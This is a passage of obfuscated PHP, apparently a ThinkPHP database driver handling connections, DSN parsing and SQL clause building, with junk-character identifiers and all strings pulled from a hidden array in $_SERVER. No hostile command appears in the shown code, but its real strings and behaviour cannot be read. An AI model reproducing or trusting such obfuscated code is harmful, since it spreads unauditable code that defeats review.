$DÎ±îˆ«¿ï($d­çºŒÄª); if ($c±ƒ…©Æ[738] != strtolower($d­çºŒÄª[$c±ƒ…©Æ[895]])) { $eÕõìòÍ¤ ->dbType = strtoupper($this->dbType); } else { $eÕõìòÍ¤ ->dbType = $this->_getDsnType($d­çºŒÄª[$c±ƒ…©Æ[850]]); } } else { think_exception(think_lang($c±ƒ…©Æ[898]) . $c±ƒ…©Æ[899] . $DÎ±îˆ«¿ï); } goto A±²µ–å™ñ; A±²µ–å™ñ: return $eÕõìòÍ¤ ; goto bÇÙ·‹ËŠè; bÇÙ·‹ËŠè: } public function __call($dÃ‡Æóš‚Ø, $eˆ­Ü•à®ç) { if (method_exists($this, $dÃ‡Æóš‚Ø)) { return call_user_func_array(array($this, $dÃ‡Æóš‚Ø), $eˆ­Ü•à®ç); } } protected function _getDsnType($b²µëö«…ª) { $eó Æš•¿¹ = explode($_SERVER[Â€Á›¨õ][4], $b²µëö«…ª); $dĞ—ÓÕš„‘ = strtoupper(trim($eó Æš•¿¹[0])); return $dĞ—ÓÕš„‘; } private function parseConfig($BÔ¹ßÖÄÏÊ = '') { $C‹·Œˆ—³Ì =& $_SERVER[Â€Á›¨õ]; if (!empty($BÔ¹ßÖÄÏÊ) && is_string($BÔ¹ßÖÄÏÊ)) { $BÔ¹ßÖÄÏÊ = $this->parseDSN($BÔ¹ßÖÄÏÊ); } elseif (is_array($BÔ¹ßÖÄÏÊ)) { $BÔ¹ßÖÄÏÊ = array_change_key_case($BÔ¹ßÖÄÏÊ); $BÔ¹ßÖÄÏÊ = array($C‹·Œˆ—³Ì[895] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[737]], $C‹·Œˆ—³Ì[823] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[900]], $C‹·Œˆ—³Ì[824] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[901]], $C‹·Œˆ—³Ì[821] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[902]], $C‹·Œˆ—³Ì[822] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[903]], $C‹·Œˆ—³Ì[17] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[904]], $C‹·Œˆ—³Ì[850] => $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[739]], $C‹·Œˆ—³Ì[13] => isset($BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[905]]) ? $BÔ¹ßÖÄÏÊ[$C‹·Œˆ—³Ì[905]] : array()); } elseif (empty($BÔ¹ßÖÄÏÊ)) { if (think_config($C‹·Œˆ—³Ì[906]) && $C‹·Œˆ—³Ì[738] != strtolower(think_config($C‹·Œˆ—³Ì[907]))) { $BÔ¹ßÖÄÏÊ = $this->parseDSN(think_config($C‹·Œˆ—³Ì[906])); } else { $BÔ¹ßÖÄÏÊ = array($C‹·Œˆ—³Ì[895] => think_config($C‹·Œˆ—³Ì[907]), $C‹·Œˆ—³Ì[823] => think_config($C‹·Œˆ—³Ì[908]), $C‹·Œˆ—³Ì[824] => think_config($C‹·Œˆ—³Ì[909]), $C‹·Œˆ—³Ì[821] => think_config($C‹·Œˆ—³Ì[910]), $C‹·Œˆ—³Ì[822] => think_config($C‹·Œˆ—³Ì[911]), $C‹·Œˆ—³Ì[17] => think_config($C‹·Œˆ—³Ì[242]), $C‹·Œˆ—³Ì[850] => think_config($C‹·Œˆ—³Ì[906]), $C‹·Œˆ—³Ì[13] => think_config($C‹·Œˆ—³Ì[912])); } } return $BÔ¹ßÖÄÏÊ; } protected function initConnect($d¶¾ÓÏÍ „ = true) { if (1 == think_config($_SERVER[Â€Á›¨õ][18])) { $this->_linkID = $this->multiConnect($d¶¾ÓÏÍ „); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $aóâÉØ°ÆŠ => $DªŠâó ­Ñ) { $this->_linkID = $DªŠâó ­Ñ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($EîŸ‰ÃÛ¸ô = false) { $BÔƒöÉÁ‹¤ =& $_SERVER[Â€Á›¨õ]; static $DÉ×‘¥¸¶Ë = array(); if (empty($DÉ×‘¥¸¶Ë)) { foreach ($this->config as $b§‰‰Ù½éæ => $aá‡ñ‘…œ‰) { $DÉ×‘¥¸¶Ë[$b§‰‰Ù½éæ] = explode($BÔƒöÉÁ‹¤[47], $aá‡ñ‘…œ‰); } } if (think_config($BÔƒöÉÁ‹¤[913])) { if ($EîŸ‰ÃÛ¸ô) { $A°¥‡Ï°Ë„ = floor(mt_rand(0, think_config($BÔƒöÉÁ‹¤[914]) - 1)); } else { if (is_numeric(think_config($BÔƒöÉÁ‹¤[915]))) { $A°¥‡Ï°Ë„ = think_config($BÔƒöÉÁ‹¤[915]); } else { $A°¥‡Ï°Ë„ = floor(mt_rand(think_config($BÔƒöÉÁ‹¤[914]), count($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[821]]) - 1)); } } } else { $A°¥‡Ï°Ë„ = floor(mt_rand(0, count($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[821]]) - 1)); } $aëŠ¥‘Û×Ô = array($BÔƒöÉÁ‹¤[823] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[823]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[823]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[823]][0], $BÔƒöÉÁ‹¤[824] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[824]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[824]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[824]][0], $BÔƒöÉÁ‹¤[821] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[821]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[821]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[821]][0], $BÔƒöÉÁ‹¤[822] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[822]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[822]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[822]][0], $BÔƒöÉÁ‹¤[17] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[17]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[17]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[17]][0], $BÔƒöÉÁ‹¤[850] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[850]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[850]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[850]][0], $BÔƒöÉÁ‹¤[13] => isset($DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[13]][$A°¥‡Ï°Ë„]) ? $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[13]][$A°¥‡Ï°Ë„] : $DÉ×‘¥¸¶Ë[$BÔƒöÉÁ‹¤[13]][0]); return $this->connect($aëŠ¥‘Û×Ô, $A°¥‡Ï°Ë„); } public function parseDSN($fØÏàÉÒ¥Ê) { $Eñ›öÃ¦Š“ =& $_SERVER[Â€Á›¨õ]; if (empty($fØÏàÉÒ¥Ê)) { return !1; } $D¼¤‡°¶Â® = parse_url($fØÏàÉÒ¥Ê); if ($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[174]]) { $dˆ†ßŸ¯£§ = array($Eñ›öÃ¦Š“[895] => $D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[174]], $Eñ›öÃ¦Š“[823] => isset($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[557]]) ? $D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[557]] : $Eñ›öÃ¦Š“[33], $Eñ›öÃ¦Š“[824] => isset($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[916]]) ? $D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[916]] : $Eñ›öÃ¦Š“[33], $Eñ›öÃ¦Š“[821] => isset($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[175]]) ? $D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[175]] : $Eñ›öÃ¦Š“[33], $Eñ›öÃ¦Š“[822] => isset($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[176]]) ? $D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[176]] : $Eñ›öÃ¦Š“[33], $Eñ›öÃ¦Š“[17] => isset($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[75]]) ? substr($D¼¤‡°¶Â®[$Eñ›öÃ¦Š“[75]], 1) : $Eñ›öÃ¦Š“[33]); } else { preg_match($Eñ›öÃ¦Š“[917], trim($fØÏàÉÒ¥Ê), $FéÃ´²²ƒƒ); $dˆ†ßŸ¯£§ = array($Eñ›öÃ¦Š“[895] => $FéÃ´²²ƒƒ[1], $Eñ›öÃ¦Š“[823] => $FéÃ´²²ƒƒ[2], $Eñ›öÃ¦Š“[824] => $FéÃ´²²ƒƒ[3], $Eñ›öÃ¦Š“[821] => $FéÃ´²²ƒƒ[4], $Eñ›öÃ¦Š“[822] => $FéÃ´²²ƒƒ[5], $Eñ›öÃ¦Š“[17] => $FéÃ´²²ƒƒ[6]); } $dˆ†ßŸ¯£§[$Eñ›öÃ¦Š“[850]] = $Eñ›öÃ¦Š“[33]; return $dˆ†ßŸ¯£§; } protected function debug() { $FğˆÉìµø³ =& $_SERVER[Â€Á›¨õ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $FğˆÉìµø³[918]; if (think_config($FğˆÉìµø³[919])) { think_status($FğˆÉìµø³[920]); think_trace($this->queryStr . $FğˆÉìµø³[921] . think_status($FğˆÉìµø³[20], $FğˆÉìµø³[920], 6) . $FğˆÉìµø³[922], $FğˆÉìµø³[33], $FğˆÉìµø³[923]); } } protected function parseLock($D¤¾Ê†•´§ = false) { $A„™¶–ìå =& $_SERVER[Â€Á›¨õ]; if (!$D¤¾Ê†•´§) { return $A„™¶–ìå[33]; } if ($A„™¶–ìå[852] == $this->dbType) { return $A„™¶–ìå[924]; } return $A„™¶–ìå[925]; } protected function parseSet($a´²„šæø) { $BÏßÂêçÇ =& $_SERVER[Â€Á›¨õ]; foreach ($a´²„šæø as $eŒ–›†ïŒ => $Cø‘Æ÷“–Œ) { if (is_array($Cø‘Æ÷“–Œ) && $BÏßÂêçÇ[293] == $Cø‘Æ÷“–Œ[0]) { $dø¢çµİï[] = $this->parseKey($eŒ–›†ïŒ) . $BÏßÂêçÇ[926] . $Cø‘Æ÷“–Œ[1]; } elseif (is_scalar($Cø‘Æ÷“–Œ) || is_null($Cø‘Æ÷“–Œ)) { $dø¢çµİï[] = $this->parseKey($eŒ–›†ïŒ) . $BÏßÂêçÇ[926] . $this->parseValue($Cø‘Æ÷“–Œ); } } return $BÏßÂêçÇ[927] . implode($BÏßÂêçÇ[47], $dø¢çµİï); } protected function bindParam($cƒÀé¦ƒ‚ , $céÏ¹‹‚Ğ¼) { $this->bind[$_SERVER[Â€Á›¨õ][4] . $cƒÀé¦ƒ‚ ] = $céÏ¹‹‚Ğ¼; } protected function parseBind($c—©ô‰ô½‰) { $c—©ô‰ô½‰ = array_merge($this->bind, $c—©ô‰ô½‰); $this->bind = array(); return $c—©ô‰ô½‰; } function parseKey(&$bø×óŠ¦È½, $f”„±Áô¬› = true) { if ($f”„±Áô¬›) { $bø×óŠ¦È½ = $this->parseKeyCheck($bø×óŠ¦È½); } return $bø×óŠ¦È½; } function parseKeyCheck($EŠŸ’ÕÜ) { $eã„ğá¹£Í =& $_SERVER[Â€Á›¨õ]; $EŠŸ’ÕÜ = trim($EŠŸ’ÕÜ); if (!preg_match($eã„ğá¹£Í[928], $EŠŸ’ÕÜ)) { think_exception($eã„ğá¹£Í[929] . $EŠŸ’ÕÜ); } return $EŠŸ’ÕÜ; } protected function parseValue($CÓÆ¯Ì•÷ë) { $dŞ›ğ«£Ï =& $_SERVER[Â€Á›¨õ]; if (is_string($CÓÆ¯Ì•÷ë)) { $CÓÆ¯Ì•÷ë = $dŞ›ğ«£Ï[891] . $this->escapeString($CÓÆ¯Ì•÷ë) . $dŞ›ğ«£Ï[891]; } elseif (isset($CÓÆ¯Ì•÷ë[0]) && is_string($CÓÆ¯Ì•÷ë[0]) && strtolower($CÓÆ¯Ì•÷ë[0]) == $dŞ›ğ«£Ï[293]) { $CÓÆ¯Ì•÷ë = $this->escapeString($CÓÆ¯Ì•÷ë[1]); } elseif (is_array($CÓÆ¯Ì•÷ë)) { $CÓÆ¯Ì•÷ë = array_map(array($this, $dŞ›ğ«£Ï[892]), $CÓÆ¯Ì•÷ë); } elseif (is_bool($CÓÆ¯Ì•÷ë)) { $CÓÆ¯Ì•÷ë = $CÓÆ¯Ì•÷ë ? $dŞ›ğ«£Ï[86] : $dŞ›ğ«£Ï[491]; } elseif (is_null($CÓÆ¯Ì•÷ë)) { $CÓÆ¯Ì•÷ë = $dŞ›ğ«£Ï[102]; } return $CÓÆ¯Ì•÷ë; } protected function parseField($cÎà¾ÛŸÒ£) { $DÂºÈƒƒ‡ =& $_SERVER[Â€Á›¨õ]; if (is_string($cÎà¾ÛŸÒ£) && strpos($cÎà¾ÛŸÒ£, $DÂºÈƒƒ‡[47])) { $cÎà¾ÛŸÒ£ = explode($DÂºÈƒƒ‡[47], $cÎà¾ÛŸÒ£); } if (is_array($cÎà¾ÛŸÒ£)) { $dÀŞÃÔìàƒ = array(); foreach ($cÎà¾ÛŸÒ£ as $C¶¦ˆ‰Ò…¾ => $e˜åİ¥ŒÓª) { if (!is_numeric($C¶¦ˆ‰Ò…¾)) { $dÀŞÃÔìàƒ[] = $this->parseKey($C¶¦ˆ‰Ò…¾, !1) . $DÂºÈƒƒ‡[930] . $this->parseKey($e˜åİ¥ŒÓª); } else { $dÀŞÃÔìàƒ[] = $this->parseKey($e˜åİ¥ŒÓª); } } $C¤²•ÔÚœÆ = implode($DÂºÈƒƒ‡[47], $dÀŞÃÔìàƒ); } elseif (is_string($cÎà¾ÛŸÒ£) && !empty($cÎà¾ÛŸÒ£)) { $C¤²•ÔÚœÆ = $cÎà¾ÛŸÒ£; } else { $C¤²•ÔÚœÆ = $DÂºÈƒƒ‡[182]; } return $C¤²•ÔÚœÆ; } protected function parseTable($E›æñŸ­éœ) { $B¿ø’öÆ£ =& $_SERVER[Â€Á›¨õ]; if (is_array($E›æñŸ­éœ)) { $e¶‹¿Û›Ê– = array(); foreach ($E›æñŸ­éœ as $a±äˆÇˆ²ô => $A‚Í®²³ˆ) { if (!is_numeric($a±äˆÇˆ²ô)) { $e¶‹¿Û›Ê–[] = $this->parseKey($a±äˆÇˆ²ô) . $B¿ø’öÆ£[50] . $this->parseKey($A‚Í®²³ˆ); } else { $e¶‹¿Û›Ê–[] = $this->parseKey($a±äˆÇˆ²ô); } } $E›æñŸ­éœ = $e¶‹¿Û›Ê–; } elseif (is_string($E›æñŸ­éœ)) { if (strstr($E›æñŸ­éœ, $B¿ø’öÆ£[50])) { return $E›æñŸ­éœ; } $E›æñŸ­éœ = explode($B¿ø’öÆ£[47], $E›æñŸ­éœ); array_walk($E›æñŸ­éœ, array($this, $B¿ø’öÆ£[841])); } return $B¿ø’öÆ£[835] . trim(implode($B¿ø’öÆ£[931], $E›æñŸ­éœ), $B¿ø’öÆ£[380]) . $B¿ø’öÆ£[835]; } protected function parseWhere($e¾ô…´áñ§) { $BÚë—’Ÿ§ =& $_SERVER[Â€Á›¨õ]; $d£ÅÉªã¨÷ = $BÚë—’Ÿ§[33]; if (is_string($e¾ô…´áñ§)) { $d£ÅÉªã¨÷ = $e¾ô…´áñ§; } else { $Fâº„ºŞÂ = isset($e¾ô…´áñ§[$BÚë—’Ÿ§[932]]) ? strtoupper($e¾ô…´áñ§[$BÚë—’Ÿ§[932]]) : $BÚë—’Ÿ§[33]; if (in_array($Fâº„ºŞÂ, array($BÚë—’Ÿ§[933], $BÚë—’Ÿ§[934], $BÚë—’Ÿ§[935]))) { $Fâº„ºŞÂ = $BÚë—’Ÿ§[50] . $Fâº„ºŞÂ . $BÚë—’Ÿ§[50]; unset($e¾ô…´áñ§[$BÚë—’Ÿ§[932]]); } else { $Fâº„ºŞÂ = $BÚë—’Ÿ§[936]; } foreach ($e¾ô…´áñ§ as $FÄÜ¶¥õÆ => $fÂ¬ñ‚…¬§) { $d£ÅÉªã¨÷ .= $BÚë—’Ÿ§[273]; if (is_numeric($FÄÜ¶¥õÆ)) { $FÄÜ¶¥õÆ = $BÚë—’Ÿ§[937]; } if (0 === strpos($FÄÜ¶¥õÆ, $BÚë—’Ÿ§[70])) { $d£ÅÉªã¨÷ .= $this->parseThinkWhere($FÄÜ¶¥õÆ, $fÂ¬ñ‚…¬§); } else { if (!preg_match($BÚë—’Ÿ§[938], trim($FÄÜ¶¥õÆ))) { think_exception(think_lang($BÚë—’Ÿ§[939]) . $BÚë—’Ÿ§[4] . $FÄÜ¶¥õÆ); } $F¤º¨ÜÄ—Â = is_array($fÂ¬ñ‚…¬§) && isset($fÂ¬ñ‚…¬§[$BÚë—’Ÿ§[940]]); $FÄÜ¶¥õÆ = trim($FÄÜ¶¥õÆ); if (strpos($FÄÜ¶¥õÆ, $BÚë—’Ÿ§[279])) { $Dœö§ùæÛ = explode($BÚë—’Ÿ§[279], $FÄÜ¶¥õÆ); $bª»ó›è = array(); foreach ($Dœö§ùæÛ as $a³›‡ØÌÑä => $EğØá…É›¬) { $A­–øø©¤Ø = $F¤º¨ÜÄ—Â ? $fÂ¬ñ‚…¬§[$a³›‡ØÌÑä] : $fÂ¬ñ‚…¬§; $bª»ó›è[] = $BÚë—’Ÿ§[256] . $this->parseWhereItem($this->parseKey($EğØá…É›¬), $A­–øø©¤Ø) . $BÚë—’Ÿ§[840]; } $d£ÅÉªã¨÷ .= implode($BÚë—’Ÿ§[941], $bª»ó›è); } elseif (strpos($FÄÜ¶¥õÆ, $BÚë—’Ÿ§[280])) { $Dœö§ùæÛ = explode($BÚë—’Ÿ§[280], $FÄÜ¶¥õÆ); $bª»ó›è = array(); foreach ($Dœö§ùæÛ as $a³›‡ØÌÑä => $EğØá…É›¬) { $A­–øø©¤Ø = $F¤º¨ÜÄ—Â ? $fÂ¬ñ‚…¬§[$a³›‡ØÌÑä] : $fÂ¬ñ‚…¬§; $bª»ó›è[] = $BÚë—’Ÿ§[256] . $this->parseWhereItem($this->parseKey($EğØá…É›¬), $A­–øø©¤Ø) . $BÚë—’Ÿ§[840]; } $d£ÅÉªã¨÷ .= implode($BÚë—’Ÿ§[936], $bª»ó›è); } else { $d£ÅÉªã¨÷ .= $this->parseWhereItem($this->parseKey($FÄÜ¶¥õÆ), $fÂ¬ñ‚…¬§); } } $d£ÅÉªã¨÷ .= $BÚë—’Ÿ§[274] . $Fâº„ºŞÂ; } $d£ÅÉªã¨÷ = substr($d£ÅÉªã¨÷, 0, -strlen($Fâº„ºŞÂ)); } return empty($d£ÅÉªã¨÷) ? $BÚë—’Ÿ§[33] : $BÚë—’Ÿ§[942] . $d£ÅÉªã¨÷; } protected function parseWhereItem($cëÍ”ß…Î‚, $F•Î£¨¯Š) { $E‚…ç ‰‰Ï =& $_SERVER[Â€Á›¨õ]; $e÷Å§‹”¯ï = $E‚…ç ‰‰Ï[33]; if (is_array($F•Î£¨¯Š)) { if (is_string($F•Î£¨¯Š[0])) { $a î×¥ä‡ = strtolower($F•Î£¨¯Š[0]); if (in_array($F•Î£¨¯Š[0], array($E‚…ç ‰‰Ï[926], $E‚…ç ‰‰Ï[943], $E‚…ç ‰‰Ï[944], $E‚…ç ‰‰Ï[945], $E‚…ç ‰‰Ï[946], $E‚…ç ‰‰Ï[947]))) { $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $F•Î£¨¯Š[0] . $E‚…ç ‰‰Ï[50] . $this->parseValue($F•Î£¨¯Š[1]); } elseif (preg_match($E‚…ç ‰‰Ï[948], $F•Î£¨¯Š[0])) { $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[50] . $this->parseValue($F•Î£¨¯Š[1]); } elseif (preg_match($E‚…ç ‰‰Ï[949], $F•Î£¨¯Š[0])) { if (is_array($F•Î£¨¯Š[1])) { $E¾ªÙ–ò = isset($F•Î£¨¯Š[2]) ? strtoupper($F•Î£¨¯Š[2]) : $E‚…ç ‰‰Ï[934]; if (in_array($E¾ªÙ–ò, array($E‚…ç ‰‰Ï[933], $E‚…ç ‰‰Ï[934], $E‚…ç ‰‰Ï[935]))) { $EŞÒµ™áØƒ = array(); foreach ($F•Î£¨¯Š[1] as $dƒêğÔß‹ï) { $EŞÒµ™áØƒ[] = $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[50] . $this->parseValue($dƒêğÔß‹ï); } $e÷Å§‹”¯ï .= $E‚…ç ‰‰Ï[256] . implode($E‚…ç ‰‰Ï[50] . $E¾ªÙ–ò . $E‚…ç ‰‰Ï[50], $EŞÒµ™áØƒ) . $E‚…ç ‰‰Ï[840]; } } else { $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[50] . $this->parseValue($F•Î£¨¯Š[1]); } } elseif ($E‚…ç ‰‰Ï[293] == $a î×¥ä‡) { $e÷Å§‹”¯ï .= $E‚…ç ‰‰Ï[838] . $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $F•Î£¨¯Š[1] . $E‚…ç ‰‰Ï[950]; } elseif (preg_match($E‚…ç ‰‰Ï[951], $F•Î£¨¯Š[0])) { $e÷Å§‹”¯ï .= $F•Î£¨¯Š[0]; } elseif (preg_match($E‚…ç ‰‰Ï[952], $F•Î£¨¯Š[0])) { if (isset($F•Î£¨¯Š[2]) && $E‚…ç ‰‰Ï[293] == $F•Î£¨¯Š[2]) { $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[50] . $F•Î£¨¯Š[1]; } else { if (is_string($F•Î£¨¯Š[1])) { $F•Î£¨¯Š[1] = explode($E‚…ç ‰‰Ï[47], $F•Î£¨¯Š[1]); } $e¨ÏÕìä˜° = implode($E‚…ç ‰‰Ï[47], $this->parseValue($F•Î£¨¯Š[1])); $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[838] . $e¨ÏÕìä˜° . $E‚…ç ‰‰Ï[840]; } } elseif (preg_match($E‚…ç ‰‰Ï[953], $F•Î£¨¯Š[0])) { $DŠ›©Âƒğï = is_string($F•Î£¨¯Š[1]) ? explode($E‚…ç ‰‰Ï[47], $F•Î£¨¯Š[1]) : $F•Î£¨¯Š[1]; $e÷Å§‹”¯ï .= $E‚…ç ‰‰Ï[838] . $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $this->exp[$a î×¥ä‡] . $E‚…ç ‰‰Ï[50] . $this->parseValue($DŠ›©Âƒğï[0]) . $E‚…ç ‰‰Ï[936] . $this->parseValue($DŠ›©Âƒğï[1]) . $E‚…ç ‰‰Ï[274]; } else { think_exception(think_lang($E‚…ç ‰‰Ï[939]) . $E‚…ç ‰‰Ï[4] . $F•Î£¨¯Š[0]); } } else { $fÓğ†óÉ­‡ = count($F•Î£¨¯Š); $B¿—©–İß‰ = $E‚…ç ‰‰Ï[33]; if (is_string($F•Î£¨¯Š[$fÓğ†óÉ­‡ - 1])) { $B¿—©–İß‰ = isset($F•Î£¨¯Š[$fÓğ†óÉ­‡ - 1]) ? strtoupper($F•Î£¨¯Š[$fÓğ†óÉ­‡ - 1]) : $E‚…ç ‰‰Ï[33]; if (in_array($B¿—©–İß‰, array($E‚…ç ‰‰Ï[933], $E‚…ç ‰‰Ï[934], $E‚…ç ‰‰Ï[935]))) { $fÓğ†óÉ­‡ = $fÓğ†óÉ­‡ - 1; } } else { $B¿—©–İß‰ = $E‚…ç ‰‰Ï[933]; } for ($B›°ŸÙÏÌ = 0; $B›°ŸÙÏÌ < $fÓğ†óÉ­‡; $B›°ŸÙÏÌ++) { $DŠ›©Âƒğï = is_array($F•Î£¨¯Š[$B›°ŸÙÏÌ]) ? $F•Î£¨¯Š[$B›°ŸÙÏÌ][1] : $F•Î£¨¯Š[$B›°ŸÙÏÌ]; if ($E‚…ç ‰‰Ï[293] == strtolower($F•Î£¨¯Š[$B›°ŸÙÏÌ][0])) { $e÷Å§‹”¯ï .= $E‚…ç ‰‰Ï[256] . $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $DŠ›©Âƒğï . $E‚…ç ‰‰Ï[950] . $B¿—©–İß‰ . $E‚…ç ‰‰Ï[50]; } else { $a»øĞÄ¢äÓ = is_array($F•Î£¨¯Š[$B›°ŸÙÏÌ]) ? $this->exp[strtolower($F•Î£¨¯Š[$B›°ŸÙÏÌ][0])] : $E‚…ç ‰‰Ï[926]; if (!$a»øĞÄ¢äÓ && is_array($F•Î£¨¯Š[$B›°ŸÙÏÌ]) && in_array($F•Î£¨¯Š[$B›°ŸÙÏÌ][0], array($E‚…ç ‰‰Ï[926], $E‚…ç ‰‰Ï[943], $E‚…ç ‰‰Ï[944], $E‚…ç ‰‰Ï[945], $E‚…ç ‰‰Ï[946], $E‚…ç ‰‰Ï[947]))) { $a»øĞÄ¢äÓ = $F•Î£¨¯Š[$B›°ŸÙÏÌ][0]; } $e÷Å§‹”¯ï .= $E‚…ç ‰‰Ï[256] . $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[50] . $a»øĞÄ¢äÓ . $E‚…ç ‰‰Ï[50] . $this->parseValue($DŠ›©Âƒğï) . $E‚…ç ‰‰Ï[950] . $B¿—©–İß‰ . $E‚…ç ‰‰Ï[50]; } } $e÷Å§‹”¯ï = substr($e÷Å§‹”¯ï, 0, -4); } } else { $e÷Å§‹”¯ï .= $cëÍ”ß…Î‚ . $E‚…ç ‰‰Ï[954] . $this->parseValue($F•Î£¨¯Š); } return $e÷Å§‹”¯ï; } protected function parseThinkWhere($DŞ²éõ¾£î, $F’â£Ã­ª‡) { $C‚œå½ù•Š =& $_SERVER[Â€Á›¨õ]; $cšŒ‚³ ¿¨ = $C‚œå½ù•Š[33]; switch ($DŞ²éõ¾£î) { case $C‚œå½ù•Š[348]: $cšŒ‚³ ¿¨ = $F’â£Ã­ª‡; break; case $C‚œå½ù•Š[937]: $cšŒ‚³ ¿¨ = is_string($F’â£Ã­ª‡) ? $F’â£Ã­ª‡ : substr($this->parseWhere($F’â£Ã­ª‡), 6); break; case $C‚œå½ù•Š[955]: parse_str($F’â£Ã­ª‡, $eÑ×ï³öè); if (isset($eÑ×ï³öè[$C‚œå½ù•Š[932]])) { $fä›²Ÿ™¯ = $C‚œå½ù•Š[50] . strtoupper($eÑ×ï³öè[$C‚œå½ù•Š[932]]) . $C‚œå½ù•Š[50]; unset($eÑ×ï³öè[$C‚œå½ù•Š[932]]); } else { $fä›²Ÿ™¯ = $C‚œå½ù•Š[936]; } $eÀö»ğõ±ì = array(); foreach ($eÑ×ï³öè as $b‘ªŠ¹ÄÈ© => $cªÉ²¾©…›) { $eÀö»ğõ±ì[] = $this->parseKey($b‘ªŠ¹ÄÈ©) . $C‚œå½ù•Š[954] . $this->parseValue($cªÉ²¾©…›); } $cšŒ‚³ ¿¨ = implode($fä›²Ÿ™¯, $eÀö»ğõ±ì); break; } return $cšŒ‚³ ¿¨; } protected function parseLimit($aÙ¥ã‚¢ß) { $b¸Ìé´ï®Á =& $_SERVER[Â€Á›¨õ]; return !empty($aÙ¥ã‚¢ß) ? $b¸Ìé´ï®Á[48] . $aÙ¥ã‚¢ß . $b¸Ìé´ï®Á[50] : $b¸Ìé´ï®Á[33]; } protected function parseJoin($Cº½Æ»º„) { $Dö˜Ÿ›‡‘„ =& $_SERVER[Â€Á›¨õ]; $FÅÙéËÀ® = $Dö˜Ÿ›‡‘„[33]; if (!empty($Cº½Æ»º„)) { if (is_array($Cº½Æ»º„)) { foreach ($Cº½Æ»º„ as $fá¯•¸Ó‰Ï => $C¹Œ©İé‰Ã) { if (!1 !== stripos($C¹Œ©İé‰Ã, $Dö˜Ÿ›‡‘„[956])) { $FÅÙéËÀ® .= $Dö˜Ÿ›‡‘„[50] . $C¹Œ©İé‰Ã; } else { $FÅÙéËÀ® .= $Dö˜Ÿ›‡‘„[957] . $C¹Œ©İé‰Ã; } } } else { $FÅÙéËÀ® .= $Dö˜Ÿ›‡‘„[957] . $Cº½Æ»º„; } } $FÅÙéËÀ® = 